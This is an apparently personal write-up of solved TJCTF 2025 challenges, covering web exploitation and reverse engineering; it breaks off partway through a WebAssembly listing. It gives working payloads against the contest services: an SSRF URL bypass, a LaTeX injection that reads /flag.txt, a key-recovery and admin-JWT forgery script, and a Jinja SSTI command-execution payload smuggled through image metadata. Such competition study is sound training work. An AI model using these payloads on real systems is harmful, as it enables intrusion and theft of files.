---
title: "TJCTF 2025"
date: "2025-06-08"
description: "ctf event with the most challenges i solved :v"
categories: [
    "Write-up"
]
tags : [
    "International",
    "As KNowN as B4r"
]
image: logo.png
---
> TJCTF is an international cybersecurity competition hosted by TJCSC, a group of students from Thomas Jefferson High School for Science and Technology in Northern Virginia. The competition consists of a variety of computer science and cybersecurity challenges in an online, jeopardy-style format. You’ll earn points through solving challenges in categories such as binary exploitation, reverse engineering, cryptography, and web. 

Today I just finished participating in a CTF event called TJCTF, and I played by myself `(As KNowN as B4r)`.

And this is the first CTF event that I solved the most times alone, solved 27 challenges in total.

![](challs.png)

Lets start with reversed...
## Web Exploitation
### loopy

![](loopy.png)

We are given a Web service "Website Preview Tool",

![](loopyweb.png)

As it says in the desc, we need to access the admin page in port 5000 (to get the flag),

If you can understand the meaning of the desc, it indirectly tells you that this website has SSRF vulnerability

![](loopyadmin.png)

So, we can try to input like `localhost:5000/admin` but, the server banned it,

![](loopyerror.png)

but we can still use `0` as local IP, so the payload is `http://0:5000/admin`

![](loopyflag.png)

Flag: `tjctf{i_l0v3_ssssSsrF_9o4a8}`

### TeXploit

![](texploit.png)

We are given a web service for LaTeX compiler,

![](latex.png)

If we try to input random thing, the server will compile our input become LaTeX text in PDF

![](latexoutput.png)

Here I just heard about exploitation in latex, so I searched for a long time on Google and i found this \
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/LaTeX%20Injection

and i tried many payload, but the server seems banned some,

![](latexpayload1.png)

![](latexpayload2.png)

then i tried to find some again payload that didn't use blacklisted char 

after a long time with many reference payload, i created this payload 
```latex
\newread\myFile
\openin\myFile=/flag.txt
\def\readnextline{
  \ifeof\myFile\else
    \read\myFile to \fileLine
    \detokenize\expandafter{\fileLine}\par
    \readnextline
  \fi
}
\readnextline
\closein\myFile
```
this payload didnt use any blacklisted term,

![](latexpayload3.png)

very readable flag, then i tried construct it with my most logical brain (this is takes 15 minutes) 

Flag: `tjctf{f1l3_i0_1n_l4t3x?}`

### front-door

![](frontdoor.png)

So we are given a web, which can be logged in temporarily, and we can login with anything but not admin,

![](frontdoorlogin.png)

After login, u will notice that there is JWT cookie,

`eyJhbGciOiAiQURNSU5IQVNIIiwgInR5cCI6ICJKV1QifQ.eyJ1c2VybmFtZSI6ICJiYXIiLCAicGFzc3dvcmQiOiAiYmFyIiwgImFkbWluIjogImZhbHNlIn0.JZOAYHBBBBNBDDQABXBFJOABZBLBBSOBVLBWVBQRSJJBOJYXDQZBEIRQBSOOFFWB`

and if u access `/products`, there is some functions 

```py
      def has(inp):
            hashed = ""
            key = jwt_key
            for i in range(64):
                hashed = hashed + hash_char(inp[i % len(inp)], key[i % len(key)])
            return hashed

        def hash_char(hash_char, key_char):
            return chr(pow(ord(hash_char), ord(key_char), 26) + 65)
```
this is related to jwt \
The main weakness is in the modulo 26 operation `(pow(..., ..., 26))`. Since the modulus is very small, we can easily brute-force every character of the `jwt_key`

We have the “plaintext” (JWT data) and the “ciphertext” (signature) this allows us to launch a known-plaintext attack to find the key

```py
def hash_char(hash_char, key_char):
    try:
        return chr(pow(ord(hash_char), ord(key_char), 26) + 65)
    except (ValueError, TypeError):
        return None

inp = "eyJhbGciOiAiQURNSU5IQVNIIiwgInR5cCI6ICJKV1QifQ.eyJ1c2VybmFtZSI6ICJhIiwgInBhc3N3b3JkIjogImEiLCAiYWRtaW4iOiAiZmFsc2UifQ"
known_signature = "JZOAYHBBBBNBDDQABXBFJOABZBLBBSOBVLBWVBQRSJJBOJYXDQZBEIRQBSOOFFWB"

cracked_key_chars = []

for i in range(64):
    input_char = inp[i % len(inp)]
    signature_char = known_signature[i]
    found = False
    for key_ord_candidate in range(256):
        key_char_candidate = chr(key_ord_candidate)
        if hash_char(input_char, key_char_candidate) == signature_char:
            cracked_key_chars.append(key_char_candidate)
            print(f"Position {i}: Input='{input_char}', Signature='{signature_char}' -> Found key character: '{key_char_candidate}' (ASCII: {key_ord_candidate})")
            found = True
            break
    if not found:
        print(f"FAILED at position {i}: No matching key character for input='{input_char}' and signature='{signature_char}'")
        break

if len(cracked_key_chars) == 64:
    print("".join(cracked_key_chars))
```

![](frontdoorascii.png)

`2, 3, 3, 1, 5, 7, 0, 0, 0, 0, 1, 0, 1, 8, 2, 1, 0, 2, 0, 3, 2, 4, 1, 0, 2, 0, 7, 0, 0, 9, 6, 0, 1, 7, 0, 8, 1, 0, 2, 5, 3, 2, 2, 0, 12, 2, 5, 1, 2, 2, 3, 0, 2, 1, 1, 8, 0, 1, 2, 2, 1, 3, 8, 0` is the `key`

then we can make a new JWT cookie,
```py
def hash_char(hash_char, key_char):
    return chr(pow(ord(hash_char), ord(key_char), 26) + 65)

def has(inp, key):
    hashed = ""
    for i in range(64):
        hashed = hashed + hash_char(inp[i % len(inp)], key[i % len(key)])
    return hashed

ascii_values = [2, 3, 3, 1, 5, 7, 0, 0, 0, 0, 1, 0, 1, 8, 2, 1, 0, 2, 0, 3, 2, 4, 1, 0, 2, 0, 7, 0, 0, 9, 6, 0, 1, 7, 0, 8, 1, 0, 2, 5, 3, 2, 2, 0, 12, 2, 5, 1, 2, 2, 3, 0, 2, 1, 1, 8, 0, 1, 2, 2, 1, 3, 8, 0]
jwt_key = "".join([chr(val) for val in ascii_values])

new_inp = "eyJhbGciOiAiQURNSU5IQVNIIiwgInR5cCI6ICJKV1QifQ.eyJ1c2VybmFtZSI6ICJhIiwgInBhc3N3b3JkIjogImEiLCAiYWRtaW4iOiAidHJ1ZSJ9"

new_signature = has(new_inp, jwt_key)
final_jwt = new_inp + "." + new_signature
print(final_jwt)
```
output: `eyJhbGciOiAiQURNSU5IQVNIIiwgInR5cCI6ICJKV1QifQ.eyJ1c2VybmFtZSI6ICJhIiwgInBhc3N3b3JkIjogImEiLCAiYWRtaW4iOiAidHJ1ZSJ9.JZOAYHBBBBNBDDQABXBFJOABZBLBBSOBVLBWVBQRSJJBOJYXDQZBEIRQBSOOFFWB`

then set the new JWT,

![](frontdooradmin.png)

there is new endpoint `/todo`

![](frontdoortodo.png)

first, i have no idea about what is this, so i just use dcode identifier, then i tried with XOR

![](frontdoordecode.png)

and access endpoint `/business_secrets`

![](frontdoorflag.png)

Flag: `tjctf{buy_h1gh_s3l1_l0w}`

### hidden-canvas

![](hiddencanvas.png)

So we got a web serivce that can upload a image

![](tampilanweb.png)

Initially, I thought that we need to upload `webshell` with all its bypass techniques, but there is this one error that indicates that this is a vulnerability in file upload, but does not use `webshell`..

![](eror.png)

`Incorrect MIME type`, this indicates that the server is validating the image inputed by the user, so even though I have done all kinds of bypasses here from naming the webshell `webshell.jpg.php` to changing the magic byte, it still doesn't get through because the server validates all the content in the image entered by the user.

So here I try to just upload random image with the addition of variables in the metadata

![](exiftool1.png)

![](res1.png)

`[Caption Error: Invalid Base64 data ('utf-8' codec can't decode byte 0x93 in position 2: invalid start byte)]` This shows that the server, in addition to extracting extra metadata on the image, also decodes it as base64, so the way to do this is by first encoding the payload in the metadata with base64

![](res2.png)

then now, i tried to test it with `SSTI` payload `{{7*7}}`

![](res3.png)

then use SSTI RCE payload `{{ cycler.__init__.__globals__.os.popen('ls').read() }}`

![](res4.png)

then cat the `flag.txt`

![](flag.png)

Flag: `tjctf{H1dd3n_C@nv@s_D3c0d3d_4nd_R3nd3r3d!}`

## Reverse Engineering
### guess-again

![](guess-again.png)

We got a xlsm file, this already indicates that there is something in the xlsm file, so we can just use `olevba` to extract 

![](guessagainvba.png)

```ruby
Sub CheckFlag()
    Dim guess As String
    guess = ActiveSheet.Shapes("TextBox 1").TextFrame2.TextRange.Text

    If Len(guess) < 7 Then
        MsgBox "Incorrect"
        Exit Sub
    End If

    If Left(guess, 6) <> "tjctf{" Or Right(guess, 1) <> "}" Then
        MsgBox "Flag must start with tjctf{ and end with }"
        Exit Sub
    End If

    Dim inner As String
    inner = Mid(guess, 7, Len(guess) - 7)

    Dim expectedCodes As Variant
    expectedCodes = Array(98, 117, 116, 95, 99, 52, 110, 95, 49, 116, 95, 114, 117, 110, 95, 100, 48, 48, 109)
    Dim i As Long
    If Len(inner) <> (UBound(expectedCodes) - LBound(expectedCodes) + 1) Then
        MsgBox "Incorrect"
        Exit Sub
    End If
    For i = 1 To Len(inner)
        If Asc(Mid(inner, i, 1)) <> expectedCodes(i - 1) Then
            MsgBox "Incorrect"
            Exit Sub
        End If
    Next i

    MsgBox "Flag correct!"
End Sub



Function check(str, arr, idx1, idx2) As Boolean
    If Mid(str, idx1, 1) = Chr(arr(idx2)) Then
        check = True
    Else
        check = False
End Function
```
to reconsturct the flag, as you can see here
```r
expectedCodes = Array(98, 117, 116, 95, 99, 52, 110, 95, 49, 116, 95, 114, 117, 110, 95, 100, 48, 48, 109)
```
it is just ASCII, and this is the solver
```py
expected_codes = [98, 117, 116, 95, 99, 52, 110, 95, 49, 116, 95, 114, 117, 110, 95, 100, 48, 48, 109]
inner_flag = "".join(chr(code) for code in expected_codes)
flag = f"tjctf{{{inner_flag}}}"
print(flag)
```
Flag: `tjctf{but_c4n_1t_run_d00m}`

### serpent

![](serpent.png)

So we got `ast_dump.pickle`, AST is stand for (Abstract Syntax Tree), to construct it again, we can use this solver

```py
import ast
import pickle

with open("ast_dump.pickle", "rb") as f:
    tree = pickle.load(f)

print(ast.unparse(tree))  
```
Output:
```py
import random
import base64
import hashlib
from typing import List, Dict, Optional, Union, Any

class DataProcessor:

    def __init__(self):
        self.data = []
        self.cache = {}
        self.config = {'debug': False, 'verbose': True, 'timeout': 30, 'retries': 3}

    def process_data(self, input_data: Any) -> Optional[str]:
        if not input_data:
            return None
        transformed = self._transform(input_data)
        validated = self._validate(transformed)
        return self._encode(validated) if validated else None

    def _transform(self, data: Any) -> str:
        fake_secret = 'not_the_flag'
        decoy_1 = 'tjctf{h4ck3r_t1m3}'
        decoy_2 = 'tjctf{c0d3_br34k3r}'
        decoy_3 = 'tjctf{s3cur1ty_f41l}'
        decoy_4 = 'tjctf{3xpl01t_m0d3}'
        decoy_5 = 'tjctf{p4ssw0rd_cr4ck}'
        decoy_6 = 'tjctf{syst3m_h4ck}'
        decoy_7 = 'tjctf{d4t4_br34ch}'
        decoy_8 = 'tjctf{n3tw0rk_p3n3tr4t3}'
        decoy_9 = 'tjctf{cyb3r_w4rr10r}'
        decoy_10 = 'tjctf{c0mput3r_v1rus}'
        decoy_11 = 'tjctf{m4lw4r3_d3t3ct}'
        decoy_12 = 'tjctf{f1r3w4ll_byp4ss}'
        decoy_13 = 'tjctf{r00tk1t_1nst4ll}'
        decoy_14 = 'tjctf{k3yl0gg3r_r3c0rd}'
        decoy_15 = 'tjctf{sp4m_b0t_4ct1v3}'
        decoy_16 = 'tjctf{ph1sh1ng_4tt4ck}'
        decoy_17 = 'tjctf{r4ns0mw4r3_3ncrypt}'
        decoy_18 = 'tjctf{tr0j4n_h0rs3}'
        decoy_19 = 'tjctf{w0rm_spr34d}'
        decoy_20 = 'tjctf{sp00f1ng_1d3nt1ty}'
        dummy_var = 'placeholder'
        return str(data).upper()

    def _validate(self, data: str) -> bool:
        patterns = ['^[A-Z0-9_]+$', '\\w+', '.*']
        return len(data) > 0

    def _encode(self, data: str) -> str:
        encoded = base64.b64encode(data.encode()).decode()
        return encoded

class OuterLayer:

    def __init__(self):
        self.data = [1, 2, 3, 4, 5] * 100
        self.cache = {str(i): i ** 2 for i in range(50)}
        self.metadata = {'version': '1.0', 'author': 'unknown'}

    def process_data(self, input_data):

        def level_one_nested():
            decoy_a = 'tjctf{m1n3cr4ft_w0rld}'
            decoy_b = 'tjctf{r0bl0x_g4m3}'
            decoy_c = 'tjctf{f0rtn1t3_v1ct0ry}'
            decoy_d = 'tjctf{l34gu3_0f_l3g3nds}'
            decoy_e = 'tjctf{c0d_w4rf4r3}'
            decoy_f = 'tjctf{4m0ng_us_sus}'
            decoy_g = 'tjctf{f4ll_guy5_w1n}'
            decoy_h = 'tjctf{r0ck3t_l34gu3}'
            decoy_i = 'tjctf{0v3rw4tch_h3r0}'
            decoy_j = 'tjctf{v4l0r4nt_4g3nt}'

            class MiddleLayer:

                def __init__(self):
                    self.values = list(range(1000))
                    self.lookup = {chr(65 + i): i for i in range(26)}

                def deep_process(self):
                    dummy_1 = 'tjctf{sp4c3_1nv4d3rs}'
                    dummy_2 = 'tjctf{p4c_m4n_g4m3}'
                    dummy_3 = 'tjctf{t3tr1s_bl0cks}'
                    dummy_4 = 'tjctf{sup3r_m4r10}'
                    dummy_5 = 'tjctf{d0nk3y_k0ng}'
                    dummy_6 = 'tjctf{str33t_f1ght3r}'
                    dummy_7 = 'tjctf{m0rt4l_k0mb4t}'
                    dummy_8 = 'tjctf{z3ld4_l1nk}'
                    dummy_9 = 'tjctf{p0k3m0n_c4tch}'
                    dummy_10 = 'tjctf{f1n4l_f4nt4sy}'

                    def level_two_nested():
                        red_herring_1 = 'tjctf{sk1b1d1}'

                        class InnerLayer:

                            def __init__(self):
                                self.config = {'debug': False, 'verbose': True}
                                self.settings = {'timeout': 30, 'retries': 5}

                            def ultra_deep_process(self):
                                fake_inner_1 = 'tjctf{days_b4_111}'

                                def level_three_nested():
                                    distraction_1 = 'tjctf{60mgs}'

                                    class CoreLayer:

                                        def __init__(self):
                                            self.core_data = [x ** 3 for x in range(100)]
                                            self.core_cache = {}

                                        def final_process(self):
                                            noise_1 = 'tjctf{4everbody}'

                                            def level_four_nested():
                                                garbage_1 = 'tjctf{b4l3nc14ga_pr1nc3ss}'

                                                class DeepestLayer:

                                                    def __init__(self):
                                                        self.final_data = {'key': 'value'}

                                                    def ultimate_process(self):
                                                        junk_1 = 'tjctf{junk_1}'
                                                        junk_2 = 'tjctf{junk_2}'
                                                        junk_3 = 'tjctf{junk_3}'

                                                        def final_nested():
                                                            secret = 'tjctf{f0ggy_d4ys}'
                                                            return None
                                                        return final_nested()
                                                return DeepestLayer()
                                            return level_four_nested()

                                        def another_method(self):
                                            more_noise_1 = 'tjctf{more_noise_1}'
                                            more_noise_2 = 'tjctf{more_noise_2}'
                                            return 'nothing'
                                    return CoreLayer()
                                return level_three_nested()

                            def secondary_method(self):
                                secondary_fake_1 = 'tjctf{secondary_fake_1}'
                                secondary_fake_2 = 'tjctf{secondary_fake_2}'
                                return 'secondary'
                        return InnerLayer()
                    return level_two_nested()

                def alternate_method(self):
                    alternate_fake_1 = 'tjctf{alternate_fake_1}'
                    alternate_fake_2 = 'tjctf{alternate_fake_2}'
                    return 'alternate'
            return MiddleLayer()
        return level_one_nested()

def calculate_fibonacci(n: int) -> List[int]:
    if n <= 0:
        return []
    elif n == 1:
        return [0]
    elif n == 2:
        return [0, 1]
    fib = [0, 1]
    for i in range(2, n):
        fib.append(fib[i - 1] + fib[i - 2])
    return fib

def hash_generator(text: str) -> Dict[str, str]:
    hashes = {}
    hashes['md5'] = hashlib.md5(text.encode()).hexdigest()
    hashes['sha1'] = hashlib.sha1(text.encode()).hexdigest()
    hashes['sha256'] = hashlib.sha256(text.encode()).hexdigest()
    fake_flag_1 = 'tjctf{5h4d0w_run3r}'
    fake_flag_2 = 'tjctf{d4rk_m4g1c}'
    fake_flag_3 = 'tjctf{n1ght_cr4wl3r}'
    fake_flag_4 = 'tjctf{3v1l_sp1r1t}'
    fake_flag_5 = 'tjctf{bl4ck_h0l3}'
    fake_flag_6 = 'tjctf{v01d_w4lk3r}'
    fake_flag_7 = 'tjctf{d34th_st4r}'
    fake_flag_8 = 'tjctf{ch40s_l0rd}'
    fake_flag_9 = 'tjctf{w1ck3d_m1nd}'
    fake_flag_10 = 'tjctf{d00m_br1ng3r}'
    fake_flag_11 = 'tjctf{3v1l_g3n1us}'
    fake_flag_12 = 'tjctf{h3ll_sp4wn}'
    fake_flag_13 = 'tjctf{d4rk_k1ng}'
    fake_flag_14 = 'tjctf{s4t4n1c_c0d3}'
    fake_flag_15 = 'tjctf{d3m0n_h4ck3r}'
    fake_flag_16 = 'tjctf{v4mp1r3_byt3s}'
    fake_flag_17 = 'tjctf{gh0st_1n_sh3ll}'
    fake_flag_18 = 'tjctf{z0mb13_c0d3}'
    fake_flag_19 = 'tjctf{sk3l3t0n_k3y}'
    fake_flag_20 = 'tjctf{wr41th_m0d3}'
    return hashes

def obfuscated_function():
    x = 42
    y = 'hello'
    z = [1, 2, 3, 4, 5]
    ocean_flags = ['tjctf{d33p_s34s}', 'tjctf{blu3_w4v3s}', 'tjctf{0c34n_curr3nt}', 'tjctf{s4lty_w4t3r}', 'tjctf{m4r1n3_l1f3}', 'tjctf{c0r4l_r33f}', 'tjctf{wh4l3_s0ng}', 'tjctf{t1d4l_p00l}', 'tjctf{sh4rk_4tt4ck}', 'tjctf{s34_m0nst3r}']
    space_flags = ['tjctf{st4r_d4nc3r}', 'tjctf{g4l4xy_r1d3r}', 'tjctf{c0sm1c_w1nd}', 'tjctf{pl4n3t_h0p}', 'tjctf{n3bul4_dr1ft}', 'tjctf{4st3r01d_b3lt}', 'tjctf{bl4ck_h0l3}', 'tjctf{sup3rn0v4}', 'tjctf{m3t30r_sh0w3r}', 'tjctf{sp4c3_d3br1s}']
    for i in range(10):
        temp = i * 2
        if temp % 3 == 0:
            temp += 1
    nested_dict = {'level1': {'level2': {'level3': {'data': 'nothing important', 'flag': 'tjctf{d33p_f4k3}', 'ocean': ocean_flags, 'space': space_flags}}}}
    return nested_dict

def complex_logic():
    items = ['apple', 'banana', 'cherry', 'date']
    processed = []
    for item in items:
        if len(item) > 4:
            processed.append(item.upper())
        else:
            processed.append(item.lower())
    return processed

class ConfigManager:

    def __init__(self):
        self.settings = {'api_key': 'fake_key_12345', 'endpoint': 'https://api.example.com', 'version': '1.0.0'}
        self.gaming_flags = ['tjctf{g4m3r_m0d3}', 'tjctf{l3v3l_up}', 'tjctf{p0w3r_pl4y3r}', 'tjctf{b0ss_f1ght}', 'tjctf{qu3st_c0mpl3t3}', 'tjctf{l00t_dr0p}', 'tjctf{cr1t1c4l_h1t}', 'tjctf{sp33d_run}', 'tjctf{n0_scr1pt_k1dd13}', 'tjctf{pr0_pl4y3r}']
        self.music_flags = ['tjctf{b34t_dr0p}', 'tjctf{s0und_w4v3}', 'tjctf{m3l0dy_m4k3r}', 'tjctf{rh7thm_rush}', 'tjctf{4ud10_f1l3}', 'tjctf{d4nc3_fl00r}', 'tjctf{v0lum3_up}', 'tjctf{b4ss_b00st}', 'tjctf{t3mp0_ch4ng3}', 'tjctf{s0ng_qu3u3}']

    def get_setting(self, key: str) -> Optional[str]:
        return self.settings.get(key)

    def update_setting(self, key: str, value: str) -> None:
        self.settings[key] = value

def random_data_generator(size: int) -> List[int]:
    return [random.randint(1, 100) for _ in range(size)]

def string_manipulator(text: str) -> str:
    operations = [lambda x: x.upper(), lambda x: x.lower(), lambda x: x[::-1], lambda x: x.replace('a', '@'), lambda x: x.replace('e', '3')]
    result = text
    for op in operations:
        result = op(result)
    return result

def nested_loops_example():
    matrix = []
    for i in range(5):
        row = []
        for j in range(5):
            value = i * j
            if value % 2 == 0:
                row.append(value)
            else:
                row.append(value + 1)
        matrix.append(row)
    return matrix

def exception_handler():
    try:
        risky_operation = 10 / 0
    except ZeroDivisionError:
        fallback_value = 'error handled'
        return fallback_value
    except Exception as e:
        generic_error = str(e)
        return generic_error
    finally:
        cleanup_code = 'always executed'

def recursive_function(n: int) -> int:
    if n <= 1:
        return 1
    return n * recursive_function(n - 1)

def massive_red_herring_factory():
    sport_flags = ['tjctf{f00tb4ll_h3r0}', 'tjctf{b4sk3tb4ll_l3g3nd}', 'tjctf{s0cc3r_st4r}', 'tjctf{b4s3b4ll_ch4mp}', 'tjctf{t3nn1s_4c3}', 'tjctf{g0lf_m4st3r}', 'tjctf{sw1mm1ng_f4st}', 'tjctf{runn1ng_sp33d}', 'tjctf{cycl1ng_r4c3}', 'tjctf{sk41ng_tr1ck}']
    vehicle_flags = ['tjctf{c4r_3ng1n3}', 'tjctf{m0t0rcycl3_r1d3}', 'tjctf{tr4in_st4t10n}', 'tjctf{4irpl4n3_fl1ght}', 'tjctf{b04t_s41l}', 'tjctf{subm4r1n3_d1v3}', 'tjctf{h3l1c0pt3r_s0und}', 'tjctf{r0ck3t_l4unch}', 'tjctf{sp4c3sh1p_0rb1t}', 'tjctf{b1cycl3_p3d4l}']
    instrument_flags = ['tjctf{gu1t4r_s0l0}', 'tjctf{p14n0_k3ys}', 'tjctf{drum_b34t}', 'tjctf{v10l1n_str1ng}', 'tjctf{fl ut3_m3l0dy}', 'tjctf{s4x0ph0n3_j4zz}', 'tjctf{tr0mb0n3_sl1d3}', 'tjctf{cl4r1n3t_w00d}', 'tjctf{h4rp_4ng3l}', 'tjctf{0rg4n_p1p3}']
    return sport_flags + vehicle_flags + instrument_flags

def another_distraction_layer():
    job_flags = ['tjctf{d0ct0r_h34l}', 'tjctf{t34ch3r_l34rn}', 'tjctf{3ng1n33r_bu1ld}', 'tjctf{l4wy3r_d3f3nd}', 'tjctf{ch3f_c00k}', 'tjctf{p1l0t_fly}', 'tjctf{n urs3_c4r3}', 'tjctf{f1r3f1ght3r_s4v3}', 'tjctf{p0l1c3_pr0t3ct}', 'tjctf{4rt1st_cr34t3}']
    emotion_flags = ['tjctf{h4ppy_f33l}', 'tjctf{s4d_t34r}', 'tjctf{4ngry_r4g3}', 'tjctf{3xc1t3d_j0y}', 'tjctf{n3rv0us_w0rry}', 'tjctf{pr0ud_w1n}', 'tjctf{j34l0us_3nvy}', 'tjctf{c0nf1d3nt_str0ng}', 'tjctf{l0n3ly_4l0n3}', 'tjctf{c4lm_p34c3}']
    country_flags = ['tjctf{4m3r1c4_us4}', 'tjctf{c4n4d4_m4pl3}', 'tjctf{m3x1c0_t4c0}', 'tjctf{br4z1l_s4mb4}', 'tjctf{3ngl4nd_t34}', 'tjctf{fr4nc3_b4gu3tt3}', 'tjctf{g3rm4ny_b33r}', 'tjctf{1t4ly_p4st4}', 'tjctf{j4p4n_sush1}', 'tjctf{ch1n4_dr4g0n}']
    return job_flags + emotion_flags + country_flags

def ultimate_confusion_generator():
    element_flags = ['tjctf{f1r3_fl4m3}', 'tjctf{w4t3r_fl0w}', 'tjctf{34rth_s0l1d}', 'tjctf{41r_w1nd}', 'tjctf{1c3_c0ld}', 'tjctf{st34m_h0t}', 'tjctf{l1ght_br1ght}', 'tjctf{d4rkn3ss_bl4ck}', 'tjctf{3n3rgy_p0w3r}', 'tjctf{m4tt3r_4t0m}']
    mythical_flags = ['tjctf{dr4g0n_f1r3}', 'tjctf{un1c0rn_m4g1c}', 'tjctf{ph03n1x_r1s3}', 'tjctf{gr1ff1n_fl1ght}', 'tjctf{k r4k3n_t3nt4cl3}', 'tjctf{m1n0t4ur_l4byrnth}', 'tjctf{p3g4sus_w1ng}', 'tjctf{hydr4_h34d}', 'tjctf{c3nt4ur_h0rs3}', 'tjctf{m3rm41d_0c34n}']
    gem_flags = ['tjctf{d14m0nd_sp4rkl3}', 'tjctf{ruby_r3d}', 'tjctf{s4pph1r3_blu3}', 'tjctf{3m3r4ld_gr33n}', 'tjctf{t0p4z_y3ll0w}', 'tjctf{4m3thyst_purpl3}', 'tjctf{0p4l_r41nb0w}', 'tjctf{p34rl_wh1t3}', 'tjctf{qu4rtz_cl34r}', 'tjctf{0bs1d14n_bl4ck}']
    return element_flags + mythical_flags + gem_flags

def more_distractions():
    alphabet = 'abcdefghijklmnopqrstuvwxyz'
    numbers = list(range(100))
    food_flags = ['tjctf{p1zz4_t1m3}', 'tjctf{burr1t0_b0wl}', 'tjctf{c00k13_m0nst3r}', 'tjctf{c4k3_d4y}', 'tjctf{1c3_cr34m}', 'tjctf{d0nut_h0l3}', 'tjctf{sp4gh3tt1_c0d3}', 'tjctf{t4c0_tu3sd4y}', 'tjctf{s4ndw1ch_4rt}', 'tjctf{s0up_s34s0n}']
    animal_flags = ['tjctf{c4t_l0v3r}', 'tjctf{d0g_w4lk3r}', 'tjctf{b1rd_w4tch3r}', 'tjctf{f1sh_t4nk}', 'tjctf{p4nd4_3y3s}', 'tjctf{t1g3r_str1p3s}', 'tjctf{3l3ph4nt_m3m0ry}', 'tjctf{d0lph1n_3ch0}', 'tjctf{p3ngu1n_w4ddl3}', 'tjctf{m0nk3y_bus1n3ss}']
    weather_flags = ['tjctf{r41ny_d4ys}', 'tjctf{sn0wy_n1ghts}', 'tjctf{sunny_sk13s}', 'tjctf{cl0udy_m0rn1ng}', 'tjctf{st0rmy_s34s}', 'tjctf{w1ndy_h1lls}', 'tjctf{m15ty_m0unt41ns}', 'tjctf{h41l_st0rm}', 'tjctf{thu nd3r_r0ll}', 'tjctf{l1ghtn1ng_str1k3}']
    combined = []
    for letter in alphabet[:5]:
        for number in numbers[:5]:
            combined.append(f'{letter}{number}')
    return combined

def final_distraction():
    fake_secrets = ['tjctf{n0p3_try_4g41n}', 'tjctf{wr0ng_p4th}', 'tjctf{st1ll_l00k1ng}', 'tjctf{k33p_s34rch1ng}', 'tjctf{d34d_3nd}', 'tjctf{f4ls3_h0p3}', 'tjctf{m1sl34d1ng}', 'tjctf{r3d_h3rr1ng}', 'tjctf{w1ld_g00s3}', 'tjctf{bl1nd_4ll3y}']
    tech_flags = ['tjctf{c0d3_n1nj4}', 'tjctf{h4ck_th3_pl4n3t}', 'tjctf{cyb3r_gh0st}', 'tjctf{d1g1t4l_w4rr10r}', 'tjctf{b1n4ry_b34st}', 'tjctf{4lgor1thm_k1ng}', 'tjctf{d4t4_dr4g0n}', 'tjctf{c0mpr3ss10n_k1ng}', 'tjctf{3ncrypt10n_l0rd}', 'tjctf{qu4ntum_cr4ck3r}']
    color_flags = ['tjctf{r3d_4l3rt}', 'tjctf{blu3_scr33n}', 'tjctf{gr33n_c0d3}', 'tjctf{y3ll0w_w4rn1ng}', 'tjctf{purpl3_h4z3}', 'tjctf{0r4ng3_fl4m3}', 'tjctf{p1nk_p4nth3r}', 'tjctf{bl4ck_0ps}', 'tjctf{wh1t3_h4t}', 'tjctf{gr4y_4r34}']
    number_flags = ['tjctf{z3r0_d4y}', 'tjctf{0n3_sh0t}', 'tjctf{tw0_f4ct0r}', 'tjctf{thr33_str1k3s}', 'tjctf{f0ur_tw3nty}', 'tjctf{f1v3_st4rs}', 'tjctf{s1x_s3ns3s}', 'tjctf{s3v3n_s34ls}', 'tjctf{31ght_b1ts}', 'tjctf{n1n3_l1v3s}']
    for secret in fake_secrets:
        processed = secret.encode().decode()
    return 'end of distractions'
```
if u can see with ur eye correctly, u will see this,
```py
def final_nested():
    secret = 'tjctf{f0ggy_d4ys}'
    return None
```
and thats the flag\
Flag: `tjctf{f0ggy_d4ys}`

### garfield-lasagna-monday

![](garfieldlasagnamonday.png)

So we got a web,

![](garfield.png)

In here, i just input random, and direct to `/mylabs`

![](mylabs.png)

and if u open the web debugger,

![](lasagnadebug.png)

```c
(module
  (table $table0 2 2 funcref)
  (memory $memory0 256 256)
  (global $global0 (mut i32) (i32.const 5243952))
  (export "memory" (memory $memory0))
  (export "check" (func $func1))
  (export "get_flag" (func $func2))
  (export "__indirect_function_table" (table $table0))
  (export "_initialize" (func $func0))
  (export "__errno_location" (func $func6))
  (export "stackSave" (func $func3))
  (export "stackRestore" (func $func4))
  (export "stackAlloc" (func $func5))
  (elem $elem0 (i32.const 1) funcref (ref.func $func0))
  (func $func0
    nop
  )
  (func $func1 (param $var0 i32) (result i32)
    (local $var1 i32)
    block $label0
      local.get $var0
      i32.load8_u
      i32.const 98
      i32.ne
      br_if $label0
      local.get $var0
      i32.load8_u offset=1
      i32.const 108
      i32.ne
      br_if $label0
      local.get $var0
      i32.load8_u offset=2
      i32.const 117
      i32.ne
      br_if $label0
      local.get $var0
      i32.load8_u offset=3
      i32.const 101
      i32.ne
      br_if $label0
      local.get $var0
      i32.load8_u offset=4
      i32.const 124
      i32.ne
      br_if $label0
      local.get $var0
      i32.load8_u offset=5
      i32.const 116
      i32.ne
      br_if $label0
      local.get $var0
      i32.load8_u offset=6
      i32.const 117
      i32.ne
      br_if $label0
      local.get $var0
      i32.load8_u offset=7
      i32.const 120
      i32.ne
      br_if $label0
      local.get $var0
      i32.load8_u offset=8
      i32.const 101
      i32.ne
      br_if $label0
      local.get $var0
      i32.load8_u offset=9
      i32.const 100
      i32.ne
      br_if $label0
      local.get $var0
      i32.load8_u offset=10
      i32.const 111
      i32.ne
      br_if $label0
      local.get $var0
      i32.load8_u offset=11
      i32.const 124
      i32.ne
      br_if $label0
      local.get $var0
      i32.load8_u offset=12
      i32.const 100
      i32.ne
      br_if $label0
      local.get $var0
      i32.load8_u offset=13
      i32.const 97
      i32.ne
      br_if $label0
      local.get $var0
      i32.load8_u offset=14
      i32.const 110
      i32.ne
      br_if $label0
      local.get $var0
      i32.load8_u offset=15
      i32.const 99
      i32.ne
      br_if $label0
      local.get $var0
      i32.load8_u offset=16
      i32.const 101
      i32.ne
      br_if $label0
      local.get $var0
      i32.load8_u offset=17
      i32.const 124
      i32.ne
      br_if $label0
      local.get $var0
      i32.load8_u offset=18
      i32.const 99
      i32.ne
      br_if $label0
      local.get $var0
      i32.load8_u offset=19
      i32.const 104
      i32.ne
      br_if $label0
      local.get $var0
      i32.load8_u offset=20
      i32.const 97
      i32.ne
      br_if $label0
      local.get $var0
      i32.load8_u offset=21
      i32.const 111
      i32.ne
      br_if $label0
      local.get $var0
      i32.load8_u offset=22
      i32.const 115
      i32.ne
      br_if $label0
      local.get $var0
      i32.load8_u offset=23
      i32.const 124
      i32.ne
      br_if $label0
      local.get $var0
      i32.load8_u offset=24
      i32.const 112
      i32.ne
      br_if $label0
      local.get $var0
      i32.load8_u offset=25
      i32.const 97
      i32.ne
      br_if $label0
      local.get $var0
      i32.load8_u offset=26
      i32.const 110
      i32.ne
      br_if $label0
      local.get $var0
